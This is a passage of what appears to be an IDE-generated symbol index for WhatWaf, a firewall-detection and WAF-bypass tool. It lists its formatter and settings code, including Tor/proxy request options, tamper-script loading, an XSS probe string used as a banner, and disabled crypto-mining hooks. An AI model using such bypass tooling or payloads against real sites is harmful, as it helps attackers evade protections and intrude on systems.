        "peekOfCode": "def error(string):\n    print(\n            \"\\033[38m[{}]\\033[0m\".format(time.strftime(\"%H:%M:%S\")) + set_color(\"[ERROR] {}\".format(string), level=40)\n    )\ndef fatal(string):\n    print(\n            \"\\033[38m[{}]\\033[0m\".format(time.strftime(\"%H:%M:%S\")) + set_color(\"[FATAL] {}\".format(string), level=60)\n    )\ndef payload(string):\n    print(",
        "detail": "tools.whatwaf.lib.formatter",
        "documentation": {}
    },
    {
        "label": "fatal",
        "kind": 2,
        "importPath": "tools.whatwaf.lib.formatter",
        "description": "tools.whatwaf.lib.formatter",
        "peekOfCode": "def fatal(string):\n    print(\n            \"\\033[38m[{}]\\033[0m\".format(time.strftime(\"%H:%M:%S\")) + set_color(\"[FATAL] {}\".format(string), level=60)\n    )\ndef payload(string):\n    print(\n        set_color(\"[PAYLOAD] {}\".format(string), level=50)\n    )\ndef success(string):\n    print(",
        "detail": "tools.whatwaf.lib.formatter",
        "documentation": {}
    },
    {
        "label": "payload",
        "kind": 2,
        "importPath": "tools.whatwaf.lib.formatter",
        "description": "tools.whatwaf.lib.formatter",
        "peekOfCode": "def payload(string):\n    print(\n        set_color(\"[PAYLOAD] {}\".format(string), level=50)\n    )\ndef success(string):\n    print(\n            \"\\033[38m[{}]\\033[0m\".format(time.strftime(\"%H:%M:%S\")) + set_color(\"[SUCCESS] {}\".format(string), level=15)\n    )\ndef prompt(string, opts, default=\"n\", check_choice=True):\n    opts = list(opts)",
        "detail": "tools.whatwaf.lib.formatter",
        "documentation": {}
    },
    {
        "label": "success",
        "kind": 2,
        "importPath": "tools.whatwaf.lib.formatter",
        "description": "tools.whatwaf.lib.formatter",
        "peekOfCode": "def success(string):\n    print(\n            \"\\033[38m[{}]\\033[0m\".format(time.strftime(\"%H:%M:%S\")) + set_color(\"[SUCCESS] {}\".format(string), level=15)\n    )\ndef prompt(string, opts, default=\"n\", check_choice=True):\n    opts = list(opts)\n    choice = raw_input(\"\\033[38m[{}]\\033[0m[PROMPT] {}[{}]: \".format(\n        time.strftime(\"%H:%M:%S\"), string, \"/\".join(opts) if len(opts) != 0 else \"\"\n    ))\n    if check_choice:",
        "detail": "tools.whatwaf.lib.formatter",
        "documentation": {}
    },
    {
        "label": "prompt",
        "kind": 2,
        "importPath": "tools.whatwaf.lib.formatter",
        "description": "tools.whatwaf.lib.formatter",
        "peekOfCode": "def prompt(string, opts, default=\"n\", check_choice=True):\n    opts = list(opts)\n    choice = raw_input(\"\\033[38m[{}]\\033[0m[PROMPT] {}[{}]: \".format(\n        time.strftime(\"%H:%M:%S\"), string, \"/\".join(opts) if len(opts) != 0 else \"\"\n    ))\n    if check_choice:\n        if choice not in [o.lower() for o in opts]:\n            choice = default\n    return choice\ndef discover(string):",
        "detail": "tools.whatwaf.lib.formatter",
        "documentation": {}
    },
    {
        "label": "discover",
        "kind": 2,
        "importPath": "tools.whatwaf.lib.formatter",
        "description": "tools.whatwaf.lib.formatter",
        "peekOfCode": "def discover(string):\n    print(\n        \"\\033[38m[{}]\\033[0m\".format(time.strftime(\"%H:%M:%S\")) + set_color(\"[FIREWALL] {}\".format(string), level=45)\n    )",
        "detail": "tools.whatwaf.lib.formatter",
        "documentation": {}
    },
    {
        "label": "InvalidURLProvided",
        "kind": 6,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "class InvalidURLProvided(Exception): pass\nclass HTTP_HEADER:\n    \"\"\"\n    HTTP request headers list, putting it in a class because\n    it's just easier to grab them then to retype them over\n    and over again\n    \"\"\"\n    ACCEPT = \"Accept\"\n    ACCEPT_CHARSET = \"Accept-Charset\"\n    ACCEPT_ENCODING = \"Accept-Encoding\"",
        "detail": "tools.whatwaf.lib.settings",
        "documentation": {}
    },
    {
        "label": "HTTP_HEADER",
        "kind": 6,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "class HTTP_HEADER:\n    \"\"\"\n    HTTP request headers list, putting it in a class because\n    it's just easier to grab them then to retype them over\n    and over again\n    \"\"\"\n    ACCEPT = \"Accept\"\n    ACCEPT_CHARSET = \"Accept-Charset\"\n    ACCEPT_ENCODING = \"Accept-Encoding\"\n    ACCEPT_LANGUAGE = \"Accept-Language\"",
        "detail": "tools.whatwaf.lib.settings",
        "documentation": {}
    },
    {
        "label": "validate_url",
        "kind": 2,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "def validate_url(url):\n    \"\"\"\n    validate a provided URL\n    \"\"\"\n    return URL_VALIDATION.match(url)\ndef get_query(url):\n    \"\"\"\n    get the query parameter out of a URL\n    \"\"\"\n    data = urlparse.urlparse(url)",
        "detail": "tools.whatwaf.lib.settings",
        "documentation": {}
    },
    {
        "label": "get_query",
        "kind": 2,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "def get_query(url):\n    \"\"\"\n    get the query parameter out of a URL\n    \"\"\"\n    data = urlparse.urlparse(url)\n    query = \"{}?{}\".format(data.path, data.query)\n    return query\ndef get_page(url, **kwargs):\n    \"\"\"\n    get the website page, this will return a `tuple`",
        "detail": "tools.whatwaf.lib.settings",
        "documentation": {}
    },
    {
        "label": "get_page",
        "kind": 2,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "def get_page(url, **kwargs):\n    \"\"\"\n    get the website page, this will return a `tuple`\n    containing the status code, HTML and headers of the\n    requests page\n    \"\"\"\n    proxy = kwargs.get(\"proxy\", None)\n    agent = kwargs.get(\"agent\", DEFAULT_USER_AGENT)\n    provided_headers = kwargs.get(\"provided_headers\", None)\n    throttle = kwargs.get(\"throttle\", 0)",
        "detail": "tools.whatwaf.lib.settings",
        "documentation": {}
    },
    {
        "label": "get_random_agent",
        "kind": 2,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "def get_random_agent(path=\"{}/files/user_agents.txt\"):\n    \"\"\"\n    grab a random user-agent from the file to pass as\n    the HTTP User-Agent header\n    \"\"\"\n    try:\n        with open(path.format(HOME)) as agents:\n            items = [agent.strip() for agent in agents.readlines()]\n            return random.choice(items)\n    except:",
        "detail": "tools.whatwaf.lib.settings",
        "documentation": {}
    },
    {
        "label": "configure_request_headers",
        "kind": 2,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "def configure_request_headers(**kwargs):\n    \"\"\"\n    configure the HTTP request headers with a user defined\n    proxy, Tor, or a random User-Agent from the user-agent\n    file\n    \"\"\"\n    agent = kwargs.get(\"agent\", None)\n    proxy = kwargs.get(\"proxy\", None)\n    tor = kwargs.get(\"tor\", False)\n    use_random_agent = kwargs.get(\"random_agent\", False)",
        "detail": "tools.whatwaf.lib.settings",
        "documentation": {}
    },
    {
        "label": "produce_results",
        "kind": 2,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "def produce_results(found_tampers):\n    \"\"\"\n    produce the results of the tamper scripts, if any this\n    \"\"\"\n    spacer = \"-\" * 30\n    if len(found_tampers) > 0:\n        lib.formatter.success(\"apparent working tampers for target:\")\n        print(spacer)\n        for i, tamper in enumerate(found_tampers, start=1):\n            description, example, load = tamper",
        "detail": "tools.whatwaf.lib.settings",
        "documentation": {}
    },
    {
        "label": "random_string",
        "kind": 2,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "def random_string(acceptable=string.ascii_letters, length=5, use_json=False, use_yaml=False, use_csv=False):\n    \"\"\"\n    create a random string for some of the tamper scripts that\n    need a random string in order to work properly\n    \"\"\"\n    random_chars = [random.choice(acceptable) for _ in range(length)]\n    if use_json:\n        return \"{}.json\".format(''.join(random_chars))\n    elif use_yaml:\n        return \"{}.yaml\".format(''.join(random_chars))",
        "detail": "tools.whatwaf.lib.settings",
        "documentation": {}
    },
    {
        "label": "generate_random_post_string",
        "kind": 2,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "def generate_random_post_string(amount=2):\n    \"\"\"\n    generate a random POST string from a list of provided keywords\n    \"\"\"\n    send_string_retval = []\n    post_name_retval = set()\n    for _ in range(amount):\n        send_string_retval.append(\n            random_string(\n                acceptable=string.ascii_letters + string.digits,",
        "detail": "tools.whatwaf.lib.settings",
        "documentation": {}
    },
    {
        "label": "auto_assign",
        "kind": 2,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "def auto_assign(url, ssl=False):\n    \"\"\"\n    check if a protocol is given in the URL if it isn't we'll auto assign it\n    \"\"\"\n    if PROTOCOL_DETECTION.search(url) is None:\n        if ssl:\n            lib.formatter.warn(\"no protocol discovered, assigning HTTPS (SSL)\")\n            return \"https://{}\".format(url.strip())\n        else:\n            lib.formatter.warn(\"no protocol discovered assigning HTTP\")",
        "detail": "tools.whatwaf.lib.settings",
        "documentation": {}
    },
    {
        "label": "create_fingerprint",
        "kind": 2,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "def create_fingerprint(url, content, status, headers, req_data=None, speak=False):\n    \"\"\"\n    create the unknown firewall fingerprint file\n    \"\"\"\n    if not os.path.exists(UNKNOWN_PROTECTION_FINGERPRINT_PATH):\n        os.makedirs(UNKNOWN_PROTECTION_FINGERPRINT_PATH)\n    __replace_http = lambda x: x.split(\"/\")\n    __replace_specifics = lambda u: \"http://{}\".format(u.split(\"/\")[2])\n    try:\n        url = __replace_specifics(url)",
        "detail": "tools.whatwaf.lib.settings",
        "documentation": {}
    },
    {
        "label": "write_to_file",
        "kind": 2,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "def write_to_file(filename, path, data, **kwargs):\n    \"\"\"\n    write the data to a file\n    \"\"\"\n    write_yaml = kwargs.get(\"write_yaml\", False)\n    write_json = kwargs.get(\"write_json\", False)\n    write_csv = kwargs.get(\"write_csv\", False)\n    save_copy = kwargs.get(\"save_copy_to\", None)\n    full_path = \"{}/{}\".format(path, filename)\n    if not os.path.exists(path):",
        "detail": "tools.whatwaf.lib.settings",
        "documentation": {}
    },
    {
        "label": "parse_burp_request",
        "kind": 2,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "def parse_burp_request(filename):\n    \"\"\"\n    parse an XML file from Burp Suite and make a request based on what is parsed\n    \"\"\"\n    burp_request_regex = re.compile(\"<url><\\S.cdata.\", re.I)\n    tmp = set()\n    retval = []\n    with open(filename) as xml:\n        for line in xml.readlines():\n            line = line.strip()",
        "detail": "tools.whatwaf.lib.settings",
        "documentation": {}
    },
    {
        "label": "parse_googler_file",
        "kind": 2,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "def parse_googler_file(filepath):\n    \"\"\"\n    parse a JSON file provided from a Googler search\n    \"\"\"\n    retval = set()\n    try:\n        with open(filepath) as f:\n            data = json.load(f)\n            for item in data:\n                retval.add(item[\"url\"])",
        "detail": "tools.whatwaf.lib.settings",
        "documentation": {}
    },
    {
        "label": "check_version",
        "kind": 2,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "def check_version(speak=True):\n    \"\"\"\n    check the version number for updates\n    \"\"\"\n    version_url = \"https://raw.githubusercontent.com/Ekultek/WhatWaf/master/lib/settings.py\"\n    try:\n        req = requests.get(version_url)\n        content = req.text\n        version_identification = content.find(\"VERSION = \")\n        current_version = content[version_identification:version_identification + 17]",
        "detail": "tools.whatwaf.lib.settings",
        "documentation": {}
    },
    {
        "label": "get_encoding_list",
        "kind": 2,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "def get_encoding_list(directory, is_tampers=True, is_wafs=False):\n    \"\"\"\n    get a quick simple list of encodings\n    \"\"\"\n    retval = set()\n    items = os.listdir(directory)\n    for item in items:\n        if not any(skip in item for skip in [\"__init__\", \"__pycache__\"]):\n            if is_tampers:\n                item = TAMPERS_IMPORT_TEMPLATE.format(item.split(\".\")[0])",
        "detail": "tools.whatwaf.lib.settings",
        "documentation": {}
    },
    {
        "label": "test_target_connection",
        "kind": 2,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "def test_target_connection(url, proxy, agent, headers):\n    \"\"\"\n    test connection to the target URL before doing anything else\n    \"\"\"\n    test_times = 2\n    failed = 0\n    for _ in range(test_times):\n        results = get_page(url, proxy=proxy, agent=agent, provided_headers=headers)\n        _, status, _, _ = results\n        if status is not None:",
        "detail": "tools.whatwaf.lib.settings",
        "documentation": {}
    },
    {
        "label": "parse_help_menu",
        "kind": 2,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "def parse_help_menu(data, start, end):\n    \"\"\"\n    parse the help menu from a certain string to a certain string\n    and return the parsed help\n    \"\"\"\n    try:\n        # DO YOU SEE HOW MUCH EASIER IT IS WITH\n        # PYTHON2 ?!\n        start_index = data.index(start)\n        end_index = data.index(end)",
        "detail": "tools.whatwaf.lib.settings",
        "documentation": {}
    },
    {
        "label": "save_temp_issue",
        "kind": 2,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "def save_temp_issue(data):\n    \"\"\"\n    save unprocessed issues into a file so that they can be worked with later\n    \"\"\"\n    if not os.path.exists(UNPROCESSED_ISSUES_PATH):\n        os.makedirs(UNPROCESSED_ISSUES_PATH)\n    file_path = \"{}/{}.json\".format(UNPROCESSED_ISSUES_PATH, random_string(length=32))\n    with open(file_path, \"a+\") as outfile:\n        json.dump(data, outfile)\n    return file_path",
        "detail": "tools.whatwaf.lib.settings",
        "documentation": {}
    },
    {
        "label": "export_payloads",
        "kind": 2,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "def export_payloads(payloads, file_type):\n    \"\"\"\n    export cached payloads from the database into a file for further use\n    \"\"\"\n    if not os.path.exists(EXPORTED_PAYLOADS_PATH):\n        os.makedirs(EXPORTED_PAYLOADS_PATH)\n    is_json, is_csv, is_yaml = False, False, False\n    if file_type.lower() == \"json\":\n        is_json = True\n    elif file_type.lower() == \"csv\":",
        "detail": "tools.whatwaf.lib.settings",
        "documentation": {}
    },
    {
        "label": "check_url_against_cached",
        "kind": 2,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "def check_url_against_cached(given, cursor):\n    \"\"\"\n    check the netlock of the provided URL against the netlock of the\n    cached URL\n    \"\"\"\n    is_cached = False\n    cached_data = None\n    cached = lib.database.fetch_data(cursor, is_payload=False)\n    current_netlock_running = urlparse.urlparse(given).netloc\n    for item in cached:",
        "detail": "tools.whatwaf.lib.settings",
        "documentation": {}
    },
    {
        "label": "display_cached",
        "kind": 2,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "def display_cached(urls, payloads):\n    \"\"\"\n    display the database information in a neat format\n    \"\"\"\n    if urls is not None:\n        if len(urls) != 0:\n            lib.formatter.info(\"cached URLs:\")\n            print(\"\\tNetloc:{}|\\t{}Web Server:\\t{}|\\t{}Working Tampers:{}\\t|\\tIdentified Protections:\\n{}\".format(\n                \" \" * 13, \" \" * 2, \" \" * 5, \" \" * 3, \" \" * 10, \"-\" * 140\n            ))",
        "detail": "tools.whatwaf.lib.settings",
        "documentation": {}
    },
    {
        "label": "shuffle_list",
        "kind": 2,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "def shuffle_list(l):\n    \"\"\"\n    shuffle a list in a cryptographically secure manner\n    \"\"\"\n    try:\n        import secrets\n        secrets_imported = True\n    except ImportError:\n        secrets_imported = False\n    for x in range(1, len(l)):",
        "detail": "tools.whatwaf.lib.settings",
        "documentation": {}
    },
    {
        "label": "make_saying_pretty",
        "kind": 2,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "def make_saying_pretty(saying_string):\n    \"\"\"\n    make a random obfuscated saying string\n    \"\"\"\n    import importlib\n    skip_tampers = (\n        \"base64encode\", \"doubleurlencode\", \"obfuscatebyordinal\",\n        \"tripleurlencode\", \"urlencode\", \"urlencodeall\", \"__pycach\",\n        \"__init__.\", \"__init__\", \"lowercase\", \"randomcase\", \"uppercase\",\n        \"enclosebrackets\", \"maskenclosebrackets\", \"space2null\",",
        "detail": "tools.whatwaf.lib.settings",
        "documentation": {}
    },
    {
        "label": "get_miner_pid",
        "kind": 2,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "def get_miner_pid(name=\"xmrig\"):\n    \"\"\"\n    deprecated\n    \"\"\"\n    return None\ndef do_mine_for_whatwaf(proc_pid, start_time, start_it=True):\n    \"\"\"\n    whatwaf mining will no longer be done\n    \"\"\"\n    lib.formatter.info(\"Skipping mining procedure\")",
        "detail": "tools.whatwaf.lib.settings",
        "documentation": {}
    },
    {
        "label": "do_mine_for_whatwaf",
        "kind": 2,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "def do_mine_for_whatwaf(proc_pid, start_time, start_it=True):\n    \"\"\"\n    whatwaf mining will no longer be done\n    \"\"\"\n    lib.formatter.info(\"Skipping mining procedure\")\n    pass\ndef auto_update():\n    \"\"\"\n    updates from the github repo\n    \"\"\"",
        "detail": "tools.whatwaf.lib.settings",
        "documentation": {}
    },
    {
        "label": "auto_update",
        "kind": 2,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "def auto_update():\n    \"\"\"\n    updates from the github repo\n    \"\"\"\n    import git\n    try:\n        lib.formatter.info(\"attempting to update WhatWaf\")\n        repo = git.Repo()\n        current = repo.head.commit\n        repo.remotes.origin.pull()",
        "detail": "tools.whatwaf.lib.settings",
        "documentation": {}
    },
    {
        "label": "VERSION",
        "kind": 5,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "VERSION = \"2.1.4.1\"\n# version string\nVERSION_TYPE = \"($dev)\" if VERSION.count(\".\") > 1 else \"($stable)\"\n# the saying that will go inside of the banner\nSAYING = \"/><script>alert();</script>\"\nINSIDE_SAYING = '\"\\033[94mWhatWaf?\\033[0m\\033[1m<|>v{}{}\\033[1m\"'.format(VERSION, VERSION_TYPE)\n# cool looking banner\nBANNER = \"\"\"\\b\\033[1m\n\\t                          ,------.\n\\t                         '  .--.  '",
        "detail": "tools.whatwaf.lib.settings",
        "documentation": {}
    },
    {
        "label": "VERSION_TYPE",
        "kind": 5,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "VERSION_TYPE = \"($dev)\" if VERSION.count(\".\") > 1 else \"($stable)\"\n# the saying that will go inside of the banner\nSAYING = \"/><script>alert();</script>\"\nINSIDE_SAYING = '\"\\033[94mWhatWaf?\\033[0m\\033[1m<|>v{}{}\\033[1m\"'.format(VERSION, VERSION_TYPE)\n# cool looking banner\nBANNER = \"\"\"\\b\\033[1m\n\\t                          ,------.\n\\t                         '  .--.  '\n\\t,--.   .--.   ,--.   .--.|  |  |  |\n\\t|  |   |  |   |  |   |  |'--'  |  |",
        "detail": "tools.whatwaf.lib.settings",
        "documentation": {}
    },
    {
        "label": "SAYING",
        "kind": 5,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "SAYING = \"/><script>alert();</script>\"\nINSIDE_SAYING = '\"\\033[94mWhatWaf?\\033[0m\\033[1m<|>v{}{}\\033[1m\"'.format(VERSION, VERSION_TYPE)\n# cool looking banner\nBANNER = \"\"\"\\b\\033[1m\n\\t                          ,------.\n\\t                         '  .--.  '\n\\t,--.   .--.   ,--.   .--.|  |  |  |\n\\t|  |   |  |   |  |   |  |'--'  |  |\n\\t|  |   |  |   |  |   |  |    __.  |\n\\t|  |.'.|  |   |  |.'.|  |   |   .'",
        "detail": "tools.whatwaf.lib.settings",
        "documentation": {}
    },
    {
        "label": "INSIDE_SAYING",
        "kind": 5,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "INSIDE_SAYING = '\"\\033[94mWhatWaf?\\033[0m\\033[1m<|>v{}{}\\033[1m\"'.format(VERSION, VERSION_TYPE)\n# cool looking banner\nBANNER = \"\"\"\\b\\033[1m\n\\t                          ,------.\n\\t                         '  .--.  '\n\\t,--.   .--.   ,--.   .--.|  |  |  |\n\\t|  |   |  |   |  |   |  |'--'  |  |\n\\t|  |   |  |   |  |   |  |    __.  |\n\\t|  |.'.|  |   |  |.'.|  |   |   .'\n\\t|         |   |         |   |___|",
        "detail": "tools.whatwaf.lib.settings",
        "documentation": {}
    },
    {
        "label": "BANNER",
        "kind": 5,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "BANNER = \"\"\"\\b\\033[1m\n\\t                          ,------.\n\\t                         '  .--.  '\n\\t,--.   .--.   ,--.   .--.|  |  |  |\n\\t|  |   |  |   |  |   |  |'--'  |  |\n\\t|  |   |  |   |  |   |  |    __.  |\n\\t|  |.'.|  |   |  |.'.|  |   |   .'\n\\t|         |   |         |   |___|\n\\t|   ,'.   |hat|   ,'.   |af .---.\n\\t'--'   '--'   '--'   '--'   '---'",
        "detail": "tools.whatwaf.lib.settings",
        "documentation": {}
    },
    {
        "label": "RESULTS_TEMPLATE",
        "kind": 5,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "RESULTS_TEMPLATE = \"{}\\nSite: {}\\nIdentified Protections: {}\\nIdentified Tampers: {}\\nIdentified Webserver: {}\\n{}\"\n# directory to do the importing for the WAF scripts\nPLUGINS_IMPORT_TEMPLATE = \"content.plugins.{}\"\n# directory to do the importing for the tamper scripts\nTAMPERS_IMPORT_TEMPLATE = \"content.tampers.{}\"\n# link to the create a new issue page\nISSUES_LINK = \"https://github.com/Ekultek/WhatWaf/issues/new\"\n# regex to detect the URL protocol (http or https)\nPROTOCOL_DETECTION = re.compile(\"http(s)?\")\n# check if a query is in a URL or not",
        "detail": "tools.whatwaf.lib.settings",
        "documentation": {}
    },
    {
        "label": "PLUGINS_IMPORT_TEMPLATE",
        "kind": 5,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "PLUGINS_IMPORT_TEMPLATE = \"content.plugins.{}\"\n# directory to do the importing for the tamper scripts\nTAMPERS_IMPORT_TEMPLATE = \"content.tampers.{}\"\n# link to the create a new issue page\nISSUES_LINK = \"https://github.com/Ekultek/WhatWaf/issues/new\"\n# regex to detect the URL protocol (http or https)\nPROTOCOL_DETECTION = re.compile(\"http(s)?\")\n# check if a query is in a URL or not\nURL_QUERY_REGEX = re.compile(r\"(.*)[?|#](.*){1}\\=(.*)\")\n# current working directory",
        "detail": "tools.whatwaf.lib.settings",
        "documentation": {}
    },
    {
        "label": "TAMPERS_IMPORT_TEMPLATE",
        "kind": 5,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "TAMPERS_IMPORT_TEMPLATE = \"content.tampers.{}\"\n# link to the create a new issue page\nISSUES_LINK = \"https://github.com/Ekultek/WhatWaf/issues/new\"\n# regex to detect the URL protocol (http or https)\nPROTOCOL_DETECTION = re.compile(\"http(s)?\")\n# check if a query is in a URL or not\nURL_QUERY_REGEX = re.compile(r\"(.*)[?|#](.*){1}\\=(.*)\")\n# current working directory\nCUR_DIR = os.getcwd()\n# path to our home directory",
        "detail": "tools.whatwaf.lib.settings",
        "documentation": {}
    },
    {
        "label": "ISSUES_LINK",
        "kind": 5,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "ISSUES_LINK = \"https://github.com/Ekultek/WhatWaf/issues/new\"\n# regex to detect the URL protocol (http or https)\nPROTOCOL_DETECTION = re.compile(\"http(s)?\")\n# check if a query is in a URL or not\nURL_QUERY_REGEX = re.compile(r\"(.*)[?|#](.*){1}\\=(.*)\")\n# current working directory\nCUR_DIR = os.getcwd()\n# path to our home directory\nHOME = \"{}/.whatwaf\".format(os.path.expanduser(\"~\"))\n# plugins (waf scripts) path",
        "detail": "tools.whatwaf.lib.settings",
        "documentation": {}
    },
    {
        "label": "PROTOCOL_DETECTION",
        "kind": 5,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "PROTOCOL_DETECTION = re.compile(\"http(s)?\")\n# check if a query is in a URL or not\nURL_QUERY_REGEX = re.compile(r\"(.*)[?|#](.*){1}\\=(.*)\")\n# current working directory\nCUR_DIR = os.getcwd()\n# path to our home directory\nHOME = \"{}/.whatwaf\".format(os.path.expanduser(\"~\"))\n# plugins (waf scripts) path\ntry:\n    PLUGINS_DIRECTORY = \"{}/content/plugins\".format(CUR_DIR)",
        "detail": "tools.whatwaf.lib.settings",
        "documentation": {}
    },
    {
        "label": "URL_QUERY_REGEX",
        "kind": 5,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "URL_QUERY_REGEX = re.compile(r\"(.*)[?|#](.*){1}\\=(.*)\")\n# current working directory\nCUR_DIR = os.getcwd()\n# path to our home directory\nHOME = \"{}/.whatwaf\".format(os.path.expanduser(\"~\"))\n# plugins (waf scripts) path\ntry:\n    PLUGINS_DIRECTORY = \"{}/content/plugins\".format(CUR_DIR)\n    os.listdir(PLUGINS_DIRECTORY)\nexcept OSError:",
        "detail": "tools.whatwaf.lib.settings",
        "documentation": {}
    },
    {
        "label": "CUR_DIR",
        "kind": 5,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "CUR_DIR = os.getcwd()\n# path to our home directory\nHOME = \"{}/.whatwaf\".format(os.path.expanduser(\"~\"))\n# plugins (waf scripts) path\ntry:\n    PLUGINS_DIRECTORY = \"{}/content/plugins\".format(CUR_DIR)\n    os.listdir(PLUGINS_DIRECTORY)\nexcept OSError:\n    PLUGINS_DIRECTORY = \"{}/plugins\".format(HOME)\n# tampers (tamper scripts) path",
        "detail": "tools.whatwaf.lib.settings",
        "documentation": {}
    },
    {
        "label": "HOME",
        "kind": 5,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "HOME = \"{}/.whatwaf\".format(os.path.expanduser(\"~\"))\n# plugins (waf scripts) path\ntry:\n    PLUGINS_DIRECTORY = \"{}/content/plugins\".format(CUR_DIR)\n    os.listdir(PLUGINS_DIRECTORY)\nexcept OSError:\n    PLUGINS_DIRECTORY = \"{}/plugins\".format(HOME)\n# tampers (tamper scripts) path\ntry:\n    TAMPERS_DIRECTORY = \"{}/content/tampers\".format(CUR_DIR)",
        "detail": "tools.whatwaf.lib.settings",
        "documentation": {}
    },
    {
        "label": "UNKNOWN_FIREWALL_NAME",
        "kind": 5,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "UNKNOWN_FIREWALL_NAME = \"Unknown Firewall\"\n# fingerprint path for unknown firewalls\nUNKNOWN_PROTECTION_FINGERPRINT_PATH = \"{}/fingerprints\".format(HOME)\n# JSON data file path\nJSON_FILE_PATH = \"{}/json_output\".format(HOME)\n# YAML data file path\nYAML_FILE_PATH = \"{}/yaml_output\".format(HOME)\n# CSV data file path\nCSV_FILE_PATH = \"{}/csv_output\".format(HOME)\n# path to the mining home (must opt in first)",
        "detail": "tools.whatwaf.lib.settings",
        "documentation": {}
    },
    {
        "label": "UNKNOWN_PROTECTION_FINGERPRINT_PATH",
        "kind": 5,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "UNKNOWN_PROTECTION_FINGERPRINT_PATH = \"{}/fingerprints\".format(HOME)\n# JSON data file path\nJSON_FILE_PATH = \"{}/json_output\".format(HOME)\n# YAML data file path\nYAML_FILE_PATH = \"{}/yaml_output\".format(HOME)\n# CSV data file path\nCSV_FILE_PATH = \"{}/csv_output\".format(HOME)\n# path to the mining home (must opt in first)\nOPTIONAL_MINING_FOLDER_PATH = \"{}/mining\".format(HOME)\n# path to the mining data",
        "detail": "tools.whatwaf.lib.settings",
        "documentation": {}
    },
    {
        "label": "JSON_FILE_PATH",
        "kind": 5,
        "importPath": "tools.whatwaf.lib.settings",
        "description": "tools.whatwaf.lib.settings",
        "peekOfCode": "JSON_FILE_PATH = \"{}/json_output\".format(HOME)\n# YAML data file path\nYAML_FILE_PATH = \"{}/yaml_output\".format(HOME)\n# CSV data file path\nCSV_FILE_PATH = \"{}/csv_output\".format(HOME)\n# path to the mining home (must opt in first)\nOPTIONAL_MINING_FOLDER_PATH = \"{}/mining\".format(HOME)\n# path to the mining data\nOPTIONAL_MINING_CONFIG_PATH = \"{}/mine.json\".format(OPTIONAL_MINING_FOLDER_PATH)\n# where the miners sit (we'll mine using CPU only)",
        "detail": "tools.whatwaf.lib.settings",
